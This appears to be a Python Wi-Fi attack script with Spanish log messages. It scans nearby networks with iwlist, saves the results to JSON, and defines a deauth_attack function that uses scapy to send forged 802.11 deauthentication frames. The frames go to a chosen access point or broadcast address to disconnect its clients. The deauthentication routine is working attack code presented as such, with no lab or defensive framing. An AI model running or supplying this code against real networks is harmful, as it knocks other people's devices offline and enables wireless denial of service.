import subprocess
import json
import logging
from scapy.all import sendp, Dot11, RadioTap, Dot11Deauth

logging.basicConfig(level=logging.INFO)

def execute_command(command):
    result = subprocess.run(command, capture_output=True, text=True)
    return result.stdout

def list_interfaces():
    result = execute_command(["ip", "link", "show"])
    interfaces = []
    for line in result.split('\n'):
        if ": " in line:
            interface = line.split(": ")[1].split(":")[0]
            if interface != "lo":
                interfaces.append(interface)
    return interfaces

def scan_wifi(interface):
    logging.info(f"Escaneando redes con {interface}...")
    try:
        result = execute_command(["sudo", "iwlist", interface, "scan"])
        networks = parse_iwlist_output(result)
        return networks
    except Exception as e:
        logging.error(f"Error al escanear redes: {e}")
        raise e

def parse_iwlist_output(output):
    networks = []
    network = {}
    for line in output.split('\n'):
        if "Cell" in line:
            if network:
                networks.append(network)
            network = {}
            parts = line.split()
            network["BSSID"] = parts[4]
        elif "ESSID" in line:
            network["SSID"] = line.split(":")[1].strip('"')
        elif "Channel" in line:
            network["Channel"] = line.split(":")[1]
        elif "Quality" in line:
            network["Quality"] = line.split("=")[1].split()[0]
        elif "Encryption key" in line:
            network["Encryption"] = "on" if "on" in line else "off"
    if network:
        networks.append(network)
    return networks

def deauth_attack(interface, bssid, client_mac=None):
    logging.info(f"Iniciando ataque de desautenticación en {bssid}")
    pkt = RadioTap() / Dot11(type=0, subtype=12, addr1=client_mac or "ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
    try:
        sendp(pkt, iface=interface, count=100, inter=0.1, verbose=True)
        logging.info(f"Ataque enviado exitosamente a {bssid} {f'contra cliente {client_mac}' if client_mac else ''}")
    except Exception as e:
        logging.error(f"Error al enviar paquetes de desautenticación: {e}")

def save_scan_results(networks, filename="networks.json"):
    try:
        with open(filename, "w") as f:
            json.dump(networks, f, indent=4)
        logging.info(f"Resultados guardados en {filename}")
    except Exception as e:
        logging.error(f"Error al guardar los resultados: {e}")